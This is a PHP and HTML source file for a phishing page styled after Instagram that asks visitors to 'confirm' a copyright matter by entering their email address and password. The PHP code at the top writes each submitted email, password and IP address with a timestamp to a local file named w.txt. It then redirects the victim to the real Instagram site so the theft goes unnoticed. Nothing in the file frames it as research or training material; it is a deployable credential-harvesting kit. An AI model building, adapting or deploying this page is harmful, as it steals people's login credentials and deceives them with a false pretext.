<?php


if($_POST){
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$email=$_POST["email"];
	$file = fopen('w.txt', 'a');
	date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");


fwrite($file, "Mail : ".$email."\n\n"."Password : " .$_POST['password']."\n\n"."Ip Adresi : " .$ip."\n\n"."Tarih : " .$cur_time.  "\n\n\n");

fclose($file);
header("location: https://instagram.com");


}
?>


<html>
<head>
	<title>Confirm Your Mail</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.pinimg.com/originals/e6/ca/1c/e6ca1ccd7e976eb837cce45bb53b0e30.png">
</head>
<body><center>
	<header>

		<img src="resim/xq1.png" width="150">

	</header>
	<main>
		<img src="https://i.pinimg.com/originals/e6/ca/1c/e6ca1ccd7e976eb837cce45bb53b0e30.png" width="50">
			<h3 class="h3">Confirm Your Mail </h3>
			<p>
				We are need some personal info, example your mail adres, we are only checking your mail adress,and we will confirm your copyright,please enter your E-Mail Adress and Password
			</p><br>
			<form method="post" >
			<input type="email" name="email" placeholder=" E-Mail"  required="on"><br>
			<input type="password" name="password" placeholder=" Password"  required="on">
			<br>
			<button type="submit" class="a_adaskpd">Confirm</button>
		</form>
	</main>


	<div class="other">
		<img src="resim/fbb.jpg" alt="fb" width="100">
	</div>
</center>
</body>
<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{border-bottom:1px solid #cecece;
		background:white;
		
		padding-top:10px;}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
			color:#333;
			font-weight:400;
			word-spacing:1px;
			letter-spacing:1px;
			width:350px;
			max-width:90%;
			font-size:15px;
		}main input{
			transition:1s;
			padding:5px;
			border:none;
			width:220px;
			height:33px;
			outline:none;
			border:1px solid #cecece;
			padding-left:5px;
			font-size:14px;
			background:#fafafa;
			border-radius:4px;
			font-size:18px;
			margin-top:10px;

		}main input::placeholder{
			font-size:12px;
			color:#999;

		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
			margin-top:100px;
			bottom:1px;
			position:relative;
			border-top:1px solid #cecece;
			width:100%;

		}
</style>
</html>